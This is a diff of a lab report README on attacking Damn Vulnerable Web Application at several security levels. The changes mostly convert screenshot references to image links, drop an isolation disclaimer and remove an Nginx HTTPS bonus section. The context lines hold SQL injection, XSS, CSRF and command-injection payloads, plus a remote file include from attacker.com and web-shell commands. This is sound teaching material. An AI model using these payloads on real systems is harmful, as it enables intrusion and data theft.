@@ -4,7 +4,6 @@
 > **Repository:** [github.com/inciasaleem-dev/dvwa-security-lab](https://github.com/inciasaleem-dev/dvwa-security-lab)  
 > **Assignment:** Application Security Testing  
 > **Tool:** Damn Vulnerable Web Application (DVWA) via Docker  
-> ⚠️ *All testing was performed exclusively on a local, isolated Docker container. No external systems were targeted.*
 
 ---
 
@@ -27,7 +26,6 @@
 4. [Docker Inspection](#docker-inspection)
 5. [Security Analysis](#security-analysis)
 6. [OWASP Top 10 Mapping](#owasp-top-10-mapping)
-7. [Bonus Nginx HTTPS](#bonus-nginx-reverse-proxy--https)
 
 ---
 
@@ -68,7 +66,7 @@ CONTAINER ID   IMAGE                    COMMAND      CREATED        STATUS      
 a1b2c3d4e5f6   vulnerables/web-dvwa    "/main.sh"   2 minutes ago  Up 2 minutes  0.0.0.0:8080->80/tcp   dvwa
 ```
 
-📸 `screenshots/docker-ps.png`
+![Docker PS](screenshots/docker-ps.png)
 
 ---
 
@@ -104,7 +102,7 @@ Since `'1'='1'` is always true, every row in the `users` table is returned.
 ```
 Returns all usernames and MD5-hashed passwords.
 
-📸 `screenshots/sqli-low.png`
+![SQL Injection Low](screenshots/sqli-low.png)
 
 **Why it worked:** No input validation. The `$id` variable is pasted directly into the query string:
 ```php
@@ -130,7 +128,7 @@ The input field is replaced with a dropdown. The backend applies `mysql_real_esc
 SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1;
 ```
 
-📸 `screenshots/sqli-medium.png`
+![SQL Injection Medium](screenshots/sqli-medium.png)
 
 **Why it worked:** `mysql_real_escape_string()` only prevents string-context injection. Numeric fields need no quotes, making escaping irrelevant.
 
@@ -140,7 +138,7 @@ SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1;
 
 **Same payloads — result: no injection.**
 
-📸 `screenshots/sqli-high.png`
+![SQL Injection High](screenshots/sqli-high.png)
 
 **Why it failed:** PDO Prepared Statements are used:
 ```php
@@ -181,7 +179,7 @@ No data is returned directly. The attacker infers information from the applicati
 ```
 Repeat across all positions to reconstruct usernames and passwords.
 
-📸 `screenshots/sqli-blind-low.png`
+![SQL Injection Blind Low](screenshots/sqli-blind-low.png)
 
 ---
 
@@ -194,7 +192,7 @@ id=1 AND 1=2
 ```
 Numeric injection bypasses `mysql_real_escape_string()`.
 
-📸 `screenshots/sqli-blind-medium.png`
+![SQL Injection Blind Medium](screenshots/sqli-blind-medium.png)
 
 ---
 
@@ -202,7 +200,7 @@ Numeric injection bypasses `mysql_real_escape_string()`.
 
 PDO prepared statements — fully mitigated. No exploitable side-channel exists.
 
-📸 `screenshots/sqli-blind-high.png`
+![SQL Injection Blind High](screenshots/sqli-blind-high.png)
 
 ---
 
@@ -223,7 +221,7 @@ Reflected XSS occurs when user input is echoed back in the HTTP response without
 ```
 **Result:** A JavaScript alert dialog appears.
 
-📸 `screenshots/xss-reflected-low.png`
+![XSS Reflected Low](screenshots/xss-reflected-low.png)
 
 **Why it worked:**
 ```php
@@ -241,7 +239,7 @@ Input is printed directly into HTML with no encoding.
 ```
 The browser tries to load a nonexistent image, triggers `onerror`, and executes the script.
 
-📸 `screenshots/xss-reflected-medium.png`
+![XSS Reflected Medium](screenshots/xss-reflected-medium.png)
 
 **Why it worked:** Incomplete blacklist — does not cover HTML event handler attributes.
 
@@ -251,7 +249,7 @@ The browser tries to load a nonexistent image, triggers `onerror`, and executes 
 
 **Payload rendered as plain text — no execution.**
 
-📸 `screenshots/xss-reflected-high.png`
+![XSS Reflected High](screenshots/xss-reflected-high.png)
 
 **Why it failed:**
 ```php
@@ -278,7 +276,7 @@ Stored XSS persists in the database and executes for every user who loads the af
 ```
 **Result:** Script is saved to the database. Every page load fires the alert for every visitor.
 
-📸 `screenshots/xss-stored-low.png`
+![XSS Stored Low](screenshots/xss-stored-low.png)
 
 **Why it worked:** No sanitization on input or output. Raw string inserted into DB and rendered directly into page HTML.
 
@@ -291,7 +289,7 @@ Stored XSS persists in the database and executes for every user who loads the af
 <img src=x onerror=alert('Stored XSS')>
 ```
 
-📸 `screenshots/xss-stored-medium.png`
+![XSS Stored Medium](screenshots/xss-stored-medium.png)
 
 ---
 
@@ -299,7 +297,7 @@ Stored XSS persists in the database and executes for every user who loads the af
 
 `htmlspecialchars()` applied on input and output. Payload stored and rendered as escaped literal text.
 
-📸 `screenshots/xss-stored-high.png`
+![XSS Stored High](screenshots/xss-stored-high.png)
 
 ---
 
@@ -320,7 +318,7 @@ http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS
 ```
 The JavaScript reads `location.search`, parses `default`, and writes it via `innerHTML` — executing the script.
 
-📸 `screenshots/xss-dom-low.png`
+![XSS DOM Low](screenshots/xss-dom-low.png)
 
 ---
 
@@ -331,7 +329,7 @@ The server filters the `default` query parameter. The **URL fragment (`#`)** is 
 http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=English#<script>alert('XSS')</script>
 ```
 
-📸 `screenshots/xss-dom-medium.png`
+![XSS DOM Medium](screenshots/xss-dom-medium.png)
 
 **Why it worked:** Server-side filtering is blind to the URL fragment.
 
@@ -341,7 +339,7 @@ http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=English#<script>alert(
 
 A server-side whitelist only permits `English`, `French`, `Spanish`, `German`. All other values are rejected.
 
-📸 `screenshots/xss-dom-high.png`
+![XSS DOM High](screenshots/xss-dom-high.png)
 
 ---
 
@@ -368,7 +366,7 @@ CSRF tricks an authenticated user's browser into sending a forged request to a t
 ```
 Any logged-in DVWA user who opens this page has their password silently changed to `hacked`.
 
-📸 `screenshots/csrf-low.png`
+![CSRF Low](screenshots/csrf-low.png)
 
 **Why it worked:** No CSRF token. The server only checks for a valid session cookie, which the browser sends automatically — including with cross-origin requests.
 
@@ -381,7 +379,7 @@ The server checks the `Referer` header. Using **Burp Suite**, add to the forged 
 Referer: http://localhost:8080
 ```
 
-📸 `screenshots/csrf-medium.png`
+![CSRF Medium](screenshots/csrf-medium.png)
 
 **Why it worked:** The `Referer` header is client-supplied and trivially spoofed with a proxy.
 
@@ -395,7 +393,7 @@ The form contains a **CSRF token** — a cryptographically random, session-bound
 ```
 The forged request cannot include a valid token — it is unknown to the attacker.
 
-📸 `screenshots/csrf-high.png`
+![CSRF High](screenshots/csrf-high.png)
 
 **Why it failed:** Unpredictable, session-bound, single-use token. Without it the server rejects the request.
 
@@ -420,7 +418,7 @@ Command injection passes user input to a shell function, allowing additional OS 
 ```
 **Result:** Directory listings and file contents returned alongside the ping output.
 
-📸 `screenshots/cmdi-low.png`
+![Command Injection Low](screenshots/cmdi-low.png)
 
 **Why it worked:**
 ```php
@@ -438,7 +436,7 @@ No escaping — the shell interprets `;`, `&&`, and `|` as command separators.
 127.0.0.1 & whoami
 ```
 
-📸 `screenshots/cmdi-medium.png`
+![Command Injection Medium](screenshots/cmdi-medium.png)
 
 **Why it worked:** `|` and `&` are not in the blacklist.
 
@@ -448,7 +446,7 @@ No escaping — the shell interprets `;`, `&&`, and `|` as command separators.
 
 All metacharacters stripped: `|`, `&`, `;`, `-`, `$`, `(`, `)`, `` ` ``, `||`, `&&`. Only a valid IP address passes.
 
-📸 `screenshots/cmdi-high.png`
+![Command Injection High](screenshots/cmdi-high.png)
 
 ---
 
@@ -474,7 +472,7 @@ http://localhost:8080/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
 http://localhost:8080/dvwa/vulnerabilities/fi/?page=http://attacker.com/shell.php
 ```
 
-📸 `screenshots/fi-low.png`
+![File Inclusion Low](screenshots/fi-low.png)
 
 **Why it worked:** `page` parameter passed directly to `include()` with no validation.
 
@@ -488,7 +486,7 @@ http://localhost:8080/dvwa/vulnerabilities/fi/?page=http://attacker.com/shell.ph
 ```
 After stripping `../`, `....//` collapses to `../` — achieving the same traversal.
 
-📸 `screenshots/fi-medium.png`
+![File Inclusion Medium](screenshots/fi-medium.png)
 
 ---
 
@@ -496,7 +494,7 @@ After stripping `../`, `....//` collapses to `../` — achieving the same traver
 
 Strict filename whitelist — only `file1.php`, `file2.php`, `file3.php` permitted.
 
-📸 `screenshots/fi-high.png`
+![File Inclusion High](screenshots/fi-high.png)
 
 ---
 
@@ -524,7 +522,7 @@ http://localhost:8080/dvwa/hackable/uploads/shell.php?cmd=ls /var/www/html
 ```
 **Result:** Full remote code execution as `www-data`.
 
-📸 `screenshots/upload-low.png`
+![File Upload Low](screenshots/upload-low.png)
 
 **Why it worked:** No file type validation — any file accepted and stored in a web-accessible directory.
 
@@ -538,7 +536,7 @@ Content-Type: application/x-php  →  Content-Type: image/jpeg
 ```
 Keep the `.php` extension. Server trusts the client-supplied MIME type.
 
-📸 `screenshots/upload-medium.png`
+![File Upload Medium](screenshots/upload-medium.png)
 
 **Why it worked:** `Content-Type` is client-controlled and trivially spoofed.
 
@@ -548,7 +546,7 @@ Keep the `.php` extension. Server trusts the client-supplied MIME type.
 
 Server uses `getimagesize()` to verify genuine image content AND validates extension against a whitelist. `.php` files rejected regardless of MIME type.
 
-📸 `screenshots/upload-high.png`
+![File Upload High](screenshots/upload-high.png)
 
 ---
 
@@ -582,7 +580,7 @@ password123
 
 **Result:** Password `password` identified.
 
-📸 `screenshots/bruteforce-low.png`
+![Brute Force Low](screenshots/bruteforce-low.png)
 
 **Why it worked:** No rate limiting, no lockout, no CAPTCHA, no delay.
 
@@ -592,7 +590,7 @@ password123
 
 A **2-second `sleep()`** added on each failed attempt. Attack still works — just slower.
 
-📸 `screenshots/bruteforce-medium.png`
+![Brute Force Medium](screenshots/bruteforce-medium.png)
 
 **Why it only partially mitigated:** Delay slows attacks but doesn't prevent them. A 1,000-entry wordlist takes ~33 minutes instead of seconds.
 
@@ -602,7 +600,7 @@ A **2-second `sleep()`** added on each failed attempt. Attack still works — ju
 
 A **CSRF token** is embedded in the login form and changes every request. Standard Burp Intruder cannot reuse a captured request — a fresh token must be extracted from each response first.
 
-📸 `screenshots/bruteforce-high.png`
+![Brute Force High](screenshots/bruteforce-high.png)
 
 **Why it's significantly harder:** Token unpredictability combined with rate limiting makes automation complex, slow, and easily detected.
 
@@ -627,7 +625,7 @@ step=2&password_new=hacked&password_conf=hacked&Change=Change&passed_captcha=tru
 ```
 **Result:** Password changed without solving any CAPTCHA.
 
-📸 `screenshots/captcha-low.png`
+![Insecure CAPTCHA Low](screenshots/captcha-low.png)
 
 **Why it worked:** A boolean supplied by the attacker is trusted — no actual CAPTCHA validation occurs.
 
@@ -637,7 +635,7 @@ step=2&password_new=hacked&password_conf=hacked&Change=Change&passed_captcha=tru
 
 Same `passed_captcha=true` bypass works at Medium as well.
 
-📸 `screenshots/captcha-medium.png`
+![Insecure CAPTCHA Medium](screenshots/captcha-medium.png)
 
 ---
 
@@ -645,7 +643,7 @@ Same `passed_captcha=true` bypass works at Medium as well.
 
 Server validates CAPTCHA response directly with the **Google reCAPTCHA API** server-to-server. The `passed_captcha` parameter is ignored.
 
-📸 `screenshots/captcha-high.png`
+![Insecure CAPTCHA High](screenshots/captcha-high.png)
 
 **Why it failed:** Validation is fully server-side and communicates with an external authority. Client-supplied parameters have no influence.
 
@@ -664,7 +662,7 @@ CONTAINER ID   IMAGE                  COMMAND      CREATED      STATUS      PORT
 a1b2c3d4e5f6   vulnerables/web-dvwa   "/main.sh"   1 hour ago   Up 1 hour   0.0.0.0:8080->80/tcp   dvwa
 ```
 
-📸 `screenshots/docker-ps.png`
+![Docker PS](screenshots/docker-ps.png)
 
 ---
 
@@ -693,7 +691,7 @@ Key fields:
 }
 ```
 
-📸 `screenshots/docker-inspect.png`
+![Docker Inspect](screenshots/docker-inspect.png)
 
 ---
 
@@ -711,7 +709,7 @@ docker logs dvwa
 => Running
 ```
 
-📸 `screenshots/docker-logs.png`
+![Docker Logs](screenshots/docker-logs.png)
 
 ---
 
@@ -732,7 +730,7 @@ mysql --version     # MySQL 5.7.x
 apache2 -v          # Apache/2.4.x (Debian)
 ```
 
-📸 `screenshots/docker-exec.png`
+![Docker Exec](screenshots/docker-exec.png)
 
 ---
 
@@ -821,99 +819,6 @@ These vulnerabilities occur in the application logic — in PHP code that handle
 
 ---
 
-## Bonus: Nginx Reverse Proxy + HTTPS
-
-### Setup
-
-**Step 1 — Generate a self-signed SSL certificate:**
-
-```bash
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-  -keyout dvwa.key \
-  -out dvwa.crt \
-  -subj "/C=PK/ST=Sindh/L=Karachi/O=SecurityLab/CN=localhost"
-```
-
----
-
-**Step 2 — Create `nginx.conf`:**
-
-```nginx
-server {
-    listen 80;
-    server_name localhost;
-    return 301 https://$host$request_uri;
-}
-
-server {
-    listen 443 ssl;
-    server_name localhost;
-
-    ssl_certificate     /etc/nginx/certs/dvwa.crt;
-    ssl_certificate_key /etc/nginx/certs/dvwa.key;
-    ssl_protocols       TLSv1.2 TLSv1.3;
-    ssl_ciphers         HIGH:!aNULL:!MD5;
-
-    location / {
-        proxy_pass         http://dvwa:80;
-        proxy_set_header   Host $host;
-        proxy_set_header   X-Real-IP $remote_addr;
-        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header   X-Forwarded-Proto $scheme;
-    }
-}
-```
-
----
-
-**Step 3 — Create `docker-compose.yml`:**
-
-```yaml
-version: '3'
-
-services:
-  dvwa:
-    image: vulnerables/web-dvwa
-    container_name: dvwa
-    networks:
-      - dvwa-net
-
-  nginx:
-    image: nginx:alpine
-    container_name: nginx-proxy
-    ports:
-      - "80:80"
-      - "443:443"
-    volumes:
-      - ./nginx.conf:/etc/nginx/conf.d/default.conf
-      - ./dvwa.crt:/etc/nginx/certs/dvwa.crt
-      - ./dvwa.key:/etc/nginx/certs/dvwa.key
-    depends_on:
-      - dvwa
-    networks:
-      - dvwa-net
-
-networks:
-  dvwa-net:
-    driver: bridge
-```
-
----
-
-**Step 4 — Launch:**
-
-```bash
-docker-compose up -d
-docker ps
-```
-
-Access DVWA at `https://localhost` — accept the self-signed certificate warning in the browser.
-
-📸 `screenshots/bonus-https-browser.png`  
-📸 `screenshots/bonus-nginx-ps.png`
-
----
-
 ### HTTP vs HTTPS Traffic Comparison
 
 Traffic captured using **Wireshark** on the loopback interface:
@@ -929,8 +834,8 @@ Traffic captured using **Wireshark** on the loopback interface:
 | HTTP redirect | Direct access on port 8080 | Port 80 → 301 redirect → HTTPS 443 |
 | Application vulnerabilities | Present | **Still present** — HTTPS does not fix them |
 
-📸 `screenshots/bonus-wireshark-http.png`  
-📸 `screenshots/bonus-wireshark-https.png`
+![Wireshark HTTP](screenshots/bonus-wireshark-http.png)  
+![Wireshark HTTPS](screenshots/bonus-wireshark-https.png)
 
 ---
 
@@ -953,3 +858,4 @@ Neither alone is sufficient. Defense in depth means every layer is protected.
 | **Low** | None — raw input throughout | Fully exploitable |
 | **Medium** | Partial — blacklists, basic filtering | Most bypassed with simple techniques |
 | **High** | Proper — whitelists, prepared statements, tokens | Not exploitable with standard techniques |
+
